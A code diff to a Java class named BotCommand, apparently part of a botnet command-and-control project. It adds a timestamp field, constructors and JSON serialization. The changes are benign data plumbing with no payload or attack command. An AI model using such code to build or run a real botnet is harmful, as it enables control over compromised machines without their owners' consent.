@@ -26,6 +26,10 @@
 
 package com.acmutv.botnet.core.control.command;
 
+import com.acmutv.botnet.core.control.command.serial.BotCommandJsonMapper;
+import com.fasterxml.jackson.core.JsonProcessingException;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import lombok.AllArgsConstructor;
 import lombok.Data;
 import lombok.NoArgsConstructor;
 import lombok.NonNull;
@@ -42,9 +46,15 @@ import java.util.Map;
  */
 @Data
 @NoArgsConstructor
+@AllArgsConstructor
 public class BotCommand {
 
   public static final BotCommand NONE = new BotCommand();
+
+  /**
+   * The command timestamp.
+   */
+  private long timestamp = 0;
 
   /**
    * The command scope.
@@ -59,11 +69,25 @@ public class BotCommand {
   private Map<String,Object> params = new HashMap<>();
 
   /**
-   * Creates a new command with the specified scope and empty parameters.
+   * Creates a new command with the specified {@code scope}, timestamp zero and empty parameters.
    * @param scope the command scope.
    */
   public BotCommand(CommandScope scope) {
     this.scope = scope;
+  }
+
+  /**
+   * Creates a new command with the specified {@code scope}, and empty parameters.
+   * @param scope the command scope.
+   */
+  public BotCommand(long timestamp, CommandScope scope) {
+    this.timestamp = timestamp;
+    this.scope = scope;
+  }
+
+  public String toJson() throws JsonProcessingException {
+    ObjectMapper mapper = new BotCommandJsonMapper();
+    return mapper.writeValueAsString(this);
   }
 
 }
